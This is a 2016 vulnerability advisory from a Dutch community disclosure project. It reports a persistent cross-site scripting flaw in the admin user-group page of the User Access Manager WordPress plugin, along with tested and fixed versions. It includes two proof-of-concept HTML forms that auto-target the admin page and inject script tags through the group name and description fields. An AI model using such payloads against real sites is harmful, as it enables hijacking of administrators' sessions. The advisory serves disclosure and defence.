------------------------------------------------------------------------
Persistent Cross-Site Scripting vulnerability in User Access Manager
WordPress Plugin
------------------------------------------------------------------------
Burak Kelebek, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A persistent Cross-Site Scripting vulnerability has been encountered in
the User Access Manager WordPress Plugin. This issue allows an attacker
to perform a wide variety of actions, such as stealing Administrators'
session tokens, or performing arbitrary actions on their behalf. In
order to exploit this issue, the attacker has to lure/force a logged on
WordPress Administrator into opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0025

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on the User Access Manager WordPress
Plugin version 1.2.6.7.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is resolved in User Access Manager version 1.2.14.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_user_access_manager_wordpress_plugin.html

Persistent Cross-Site Scripting was found in admin panel 'manage' page of User Access Manager. Multiple parameters in POST uam_usergroup are affected due to insufficient output encoding. This issue allows an attacker to perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf. In order to exploit this issue, the attacker has to lure/force a logged on WordPress Administrator into opening a malicious website.
   
Proof of concept

<html>
   <body>
      <form action="http://<target>/wp-admin/admin.php?page=uam_usergroup" method="POST">
         <input type="hidden" name="uamInsertUpdateGroupNonce" value="8657bd2424" />
         <input type="hidden" name="_wp_http_referer" value="/wp-admin/admin.php?page=uam_usergroup" />
         <input type="hidden" name="action" value="addGroup" />
         <input type="hidden" name="userGroupName" value="as<script>alert(1)</script>" />
         <input type="hidden" name="userGroupDescription" value="asd" />
         <input type="hidden" name="ipRange" value="asd" />
         <input type="hidden" name="readAccess" value="group" />
         <input type="hidden" name="writeAccess" value="group" />
         <input type="hidden" name="submit" value="Add user group" />
         <input type="hidden" name="" value="" />
         <input type="submit" value="Submit" />
      </form>
   </body>
</html>

<html>
   <body>
      <form action="http://<target>/wp-admin/admin.php?page=uam_usergroup" method="POST">
         <input type="hidden" name="uamInsertUpdateGroupNonce" value="8657bd2424" />
         <input type="hidden" name="_wp_http_referer" value="/wp-admin/admin.php?page=uam_usergroup" />
         <input type="hidden" name="action" value="addGroup" />
         <input type="hidden" name="userGroupName" value="sad" />
         <input type="hidden" name="userGroupDescription" value="<script>alert(2)</script>" />
         <input type="hidden" name="ipRange" value="asd" />
         <input type="hidden" name="readAccess" value="group" />
         <input type="hidden" name="writeAccess" value="group" />
         <input type="hidden" name="submit" value="Add user group" />
         <input type="submit" value="Submit" />
      </form>
   </body>
</html>


------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.
